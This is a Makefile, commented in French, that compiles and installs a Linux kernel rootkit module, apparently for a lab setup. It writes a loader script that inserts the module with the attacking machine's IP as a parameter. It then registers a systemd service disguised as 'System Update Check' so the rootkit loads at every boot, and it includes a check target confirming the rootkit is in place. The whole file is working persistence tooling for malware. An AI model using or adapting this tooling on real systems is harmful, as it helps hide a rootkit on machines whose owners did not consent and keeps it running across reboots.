PWD = $(shell pwd)
#preparation des paths pour poser le .ko le script sh et  le service.
KDIR := /lib/modules/$(shell uname -r)
EXTRA_DIR := $(KDIR)/extra
KO_NAME := rootkit.ko
KO_SRC := rootkit.c
obj-m += rootkit.o
KO_PATH := $(EXTRA_DIR)/$(KO_NAME) #position du module rootkit
LOAD_SCRIPT := /usr/local/bin/load-rootkit.sh #script qui run le module
SERVICE_FILE := /etc/systemd/system/update-check.service #service qui lance le script au boot
ARG := "192.168.122.86" #Ip de la vm attaquante en parametre du module

.PHONY: all build move-script create-service clean

all: build
build: $(KO_PATH) move-script create-service use-script

#creer le dir et deplace le module 
$(KO_PATH): $(KO_NAME)
	@mkdir -p $(EXTRA_DIR)
	@mv -f $(KO_NAME) $(KO_PATH)

#compile le module
$(KO_NAME): $(KO_SRC)
	@make -C $(KDIR)/build M=$(PWD) modules

#Construit le fichier script sh pour inserer le module
move-script:
	@if [ ! -f $(LOAD_SCRIPT) ]; then \
		echo "#!/bin/bash" > $(LOAD_SCRIPT); \
		echo "/sbin/insmod $(KO_PATH) ip=$(ARG)" >> $(LOAD_SCRIPT); \
		chmod +x $(LOAD_SCRIPT); \
	fi


#Creation du service
create-service:
	@if [ ! -f $(SERVICE_FILE) ]; then \
		echo "[Unit]" > $(SERVICE_FILE); \
		echo "Description=System Update Check" >> $(SERVICE_FILE); \
		echo "After=network.target" >> $(SERVICE_FILE); \
		echo "" >> $(SERVICE_FILE); \
		echo "[Service]" >> $(SERVICE_FILE); \
		echo "Type=oneshot" >> $(SERVICE_FILE); \
		echo "ExecStart=$(LOAD_SCRIPT)" >> $(SERVICE_FILE); \
		echo "RemainAfterExit=true" >> $(SERVICE_FILE); \
		echo "" >> $(SERVICE_FILE); \
		echo "[Install]" >> $(SERVICE_FILE); \
		echo "WantedBy=multi-user.target" >> $(SERVICE_FILE); \
		systemctl daemon-reload; \
		systemctl enable update-check.service; \
	fi

use-script:
	$(LOAD_SCRIPT)

clean:
	@rm -f $(KO_NAME)
	@rm -f $(KO_PATH)
	@rm -f $(LOAD_SCRIPT)
	@rm -f $(SERVICE_FILE)

check:
	@systemctl is-enabled update-check.service >/dev/null 2>&1 && echo "Service actif" ||\
	 	echo "Service non actif"
	@systemctl is-active update-check.service >/dev/null 2>&1 && echo \
	 	"Service en cours d utilisation" || echo "Service termine"

	@lsmod | grep -q "^rootkit" && echo "Module rootkit en place" || \
	 	echo "Module rootkit absent"